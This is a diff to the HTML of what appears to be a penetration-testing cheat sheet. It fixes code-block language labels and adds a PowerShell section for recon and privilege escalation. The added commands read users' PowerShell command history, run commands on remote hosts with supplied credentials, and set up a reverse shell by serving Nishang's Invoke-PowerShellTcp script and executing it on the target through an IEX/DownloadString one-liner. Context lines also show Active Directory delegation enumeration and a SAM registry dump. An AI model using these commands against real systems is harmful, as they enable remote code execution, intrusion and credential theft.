@@ -129,6 +129,8 @@
     
         <li><a class="" href="#ldap-search">LDAP search</a></li>
     
+        <li><a class="" href="#powershell">PowerShell</a></li>
+    
     </ul>
     
 
@@ -317,7 +319,7 @@
               <h1 id="windows">Windows</h1>
 <h3 id="kerberosunconstraineddelegation">KerberosUnConstrainedDelegation</h3>
 <p>More information <a href="https://adsecurity.org/?p=1667" target="_blank">here</a></p>
-<pre><code class="language-powerhsell line-numbers">$ Import-Module ActiveDirectory
+<pre><code class="language-powershell line-numbers">$ Import-Module ActiveDirectory
 $ Get-ADComputer -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515)} -Properties 'TrustedForDelegation,TrustedToAuthForDelegation,servicePrincipalName,Description'
 
 # UserAccountControl &amp; 0x80000 (TRUSTED_FOR_DELEGATION)
@@ -363,7 +365,7 @@ foreach ($object in $objects) { $object }
 </code></pre>
 
 <h3 id="collect-ad-users-information">Collect AD users information</h3>
-<pre><code class="language-powerhsell line-numbers"># Helping functions
+<pre><code class="language-powershell line-numbers"># Helping functions
 function Get-ADUserDirectoryEntry($user) {
     return (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=User)(samAccountName=$user))&quot;)).FindOne().GetDirectoryEntry()
 }
@@ -470,7 +472,7 @@ $ reg save HKLM\SAM SamBkup.hiv
 </code></pre>
 
 <h3 id="list-email-aliases">List Email aliases</h3>
-<pre><code class="language-bash line-numbers">$ (Get-ADUser -Identity &lt;user_ad_id&gt; -Properties proxyAddresses).proxyAddresses
+<pre><code class="language-powershell line-numbers">$ (Get-ADUser -Identity &lt;user_ad_id&gt; -Properties proxyAddresses).proxyAddresses
 </code></pre>
 
 <h3 id="truster-account">Truster Account</h3>
@@ -539,6 +541,35 @@ expand -f:* &quot;%temp%\\update.msu\\update.cab&quot; &quot;%temp%\\update.msu\
 
 <h3 id="ldap-search">LDAP search</h3>
 <pre><code class="language-bash line-numbers">ldapsearch -h &lt;host&gt; -x -s base namingcontext
+</code></pre>
+
+<h2 id="powershell">PowerShell</h2>
+<p>Some useful PowerShell commands that you can use during your recon or privsec phases.</p>
+<h3 id="get-powershell-command-history">Get PowerShell command history</h3>
+<pre><code class="language-powershell line-numbers">cd &quot;$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline&quot;
+gc ConsoleHost_history.txt
+</code></pre>
+
+<h3 id="execute-block-as-an-other-user">Execute block as an other user</h3>
+<pre><code class="language-powershell line-numbers">$pass = ConvertTo-SecureString '&lt;password&gt;' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential(&quot;&lt;dom&gt;\&lt;username&gt;&quot;, $pass)
+Invoke-Command -Computer &lt;computer_name&gt; -Credential $cred -ScriptBlock { cmd.exe &quot;/c &lt;cmd&gt;&quot; }
+</code></pre>
+
+<h3 id="download-and-execute-script">Download and execute script</h3>
+<p>The repository <a href="https://github.com/samratashok/nishang" target="_blank">Nishang</a> contains a good
+PowerShell script to create a <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank">reverse shell</a>.
+You need to add the following line at the end:</p>
+<pre><code class="language-powershell line-numbers">Invoke-PowerShellTcp -Reverse -IPAddress &lt;ip&gt; -Port &lt;port&gt;
+</code></pre>
+
+<p>On your local machine:</p>
+<ul>
+<li>You create an HTTP server to serve the script: <code>python -m http.serve</code></li>
+<li>You listen for an incoming <a href="../reverse-shell/">connection with nc</a>.</li>
+</ul>
+<p>And on the remote host, you execute the following PowerShell script:</p>
+<pre><code class="language-powershell line-numbers">IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;ip&gt;:&lt;port&gt;/&lt;script_name.ps1&gt;')
 </code></pre>
             
           </div>
